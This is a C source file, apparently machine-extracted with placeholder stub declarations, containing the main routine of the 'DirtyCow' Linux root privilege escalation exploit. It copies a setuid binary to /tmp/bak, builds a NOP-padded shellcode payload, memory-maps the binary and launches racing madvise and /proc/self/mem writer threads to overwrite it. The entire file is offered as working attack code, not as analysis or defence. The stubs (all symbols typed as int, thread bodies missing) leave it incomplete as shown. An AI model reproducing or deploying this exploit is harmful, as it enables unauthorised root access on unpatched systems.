
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int st_size; } ;


 int MAP_PRIVATE ;
 int O_RDONLY ;
 int PROT_READ ;
 int asprintf (char**,char*,char*) ;
 int f ;
 int fstat (int ,TYPE_1__*) ;
 int madviseThread ;
 int map ;
 int memcpy (char*,int ,scalar_t__) ;
 int memset (char*,int,int) ;
 int mmap (int *,int,int ,int ,int ,int ) ;
 int open (char*,int ) ;
 int printf (char*,...) ;
 int procselfmemThread ;
 int pth1 ;
 int pth2 ;
 int pth3 ;
 int pthread_create (int *,int *,int *,char*) ;
 int pthread_join (int ,int *) ;
 int sc ;
 scalar_t__ sc_len ;
 TYPE_1__ st ;
 char* suid_binary ;
 int system (char*) ;
 int waitForWrite ;

int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(((void*)0),st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, ((void*)0), &madviseThread, suid_binary);
    pthread_create(&pth2, ((void*)0), &procselfmemThread, payload);
    pthread_create(&pth3, ((void*)0), &waitForWrite, ((void*)0));

    pthread_join(pth3, ((void*)0));

    return 0;
}
